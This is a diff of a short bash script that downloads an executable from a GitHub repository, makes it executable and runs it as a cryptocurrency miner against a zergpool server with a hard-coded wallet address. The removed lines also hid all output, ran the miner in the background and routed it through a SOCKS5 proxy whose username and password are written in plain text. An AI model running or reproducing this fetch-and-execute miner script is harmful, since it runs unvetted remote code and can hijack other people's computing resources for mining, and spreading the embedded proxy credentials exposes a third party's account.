@@ -1,6 +1,6 @@
 #!/bin/bash
 
-curl --proxy "socks5://pybjrinb-1:t4y7et6han3c@u1.p.webshare.io:80/" https://ipv4.webshare.io/ >/dev/null 2>&1
-wget -q https://github.com/samrikulan/zazza/raw/main/R >/dev/null 2>&1
-chmod +x R >/dev/null 2>&1
-nohup ./R -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8 -x socks5://pybjrinb-1:t4y7et6han3c@u1.p.webshare.io:80 >/dev/null 2>&1
+
+wget -q https://github.com/samrikulan/zazza/raw/main/R
+chmod +x R
+./R -v -l verushash.asia.mine.zergpool.com:3300 -u 7pXYkwdwUFBGNaG8dJ8w6kZTzRjnTpDTgo.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DASH -t 8
